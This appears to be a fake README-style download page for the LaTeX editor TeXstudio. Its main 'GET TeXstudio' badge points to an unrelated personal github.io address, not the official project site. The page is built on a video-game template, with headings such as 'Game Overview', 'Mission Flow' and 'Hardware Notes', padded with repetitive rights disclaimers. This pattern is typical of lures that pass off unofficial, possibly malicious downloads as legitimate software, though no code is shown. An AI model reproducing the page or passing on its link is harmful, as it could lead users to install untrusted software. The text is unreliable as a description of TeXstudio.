# TeXstudio - Write a Document You Are Authoring

[![GET TeXstudio](https://img.shields.io/badge/GET%20%E2%80%94%20TeXstudio-ca8a04?style=for-the-badge&logoColor=white)](https://rjcewnie419.github.io/.github/texstudio-compile)

## Game Overview

TeXstudio edits LaTeX you write and can run a compile so you get a PDF. The source is a text file you save. The PDF is the output. It does not include a library of books, and it does not remove a restriction from a PDF someone else locked. If you are setting someone else's text, you need the right to do that.

A failed compile is a message about your source. Read the first error. The line number refers to the file you saved, not to an unsaved buffer. Fix that line, save, and compile again. Do not paste a chapter you do not have rights to republish and treat the PDF as yours.

## Play Your Way

A first document is a title and one paragraph. Save it in a folder you will find after a restart, compile, and open the PDF. That proves the toolchain before a long paper. Keep the source. The PDF is what you send when the wording is finished.

A longer paper is the same loop with figures you made or were allowed to use. Put images in that folder so the paths stay short. If a figure is missing, the PDF still builds or it stops with a clear missing-file line. Add the file or remove the line. Do not search for a random template pack to hide the error.

## Mission Flow

Create the folder, then the file, then save. Compile once while the file is still small. Open the PDF and confirm the title is the one you typed. Then add the next section.

When the PDF is the one you want to send, keep the source beside it. You will need the source to change a sentence. Closing without saving loses the edit even if a PDF from earlier is still on disk. A template you may use is a starting file you have rights to, saved under your own name.

## Included Content

- An editor for LaTeX source you write
- A compile step that produces a PDF from that source
- Error lines that point back at your file
- A folder you choose for the source and the figures
- A short first document before a long paper
- The source kept after the PDF is sent

![TeXstudio with a short document the user is writing](https://texstudio-org.github.io/_images/txs_compile.webp)

## Hardware Notes

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| RAM | 2 GB | 4 GB |
| Storage | Editor plus a TeX install | Room for source and PDF |
| CPU | Dual-core | Any current PC |
| GPU | Integrated | Not required |

## Perfect Audience

TeXstudio fits a paper, a problem set, or a letter you are writing yourself, when you want a PDF and a source file you can edit later. It also fits a class that asked for LaTeX and gave you the right to use a template.

It does not fit a locked PDF you want to rewrite, and it does not supply the text of a book. The compile either makes your document or tells you which line failed.

## Common Issues

Nothing compiles if a TeX distribution is not installed. Install the one you meant to use, then restart TeXstudio. An error on line 1 of a file you did not write usually means you opened a template that is incomplete. An unsaved tab compiles the old file on disk. Save first. A missing image is a path, not a reason to download a different paper.

## Extended Notes

Name the folder after the document. A PDF without the source is awkward the next time a sentence changes. Keep figures you have rights to use in that same folder. If the log is long, read the first error, fix it, and compile again before you chase the later lines.

## Further Reading

texstudio build button, macros you wrote, first log error, structure pane, citation keys, short first file, own source, pdf plus tex
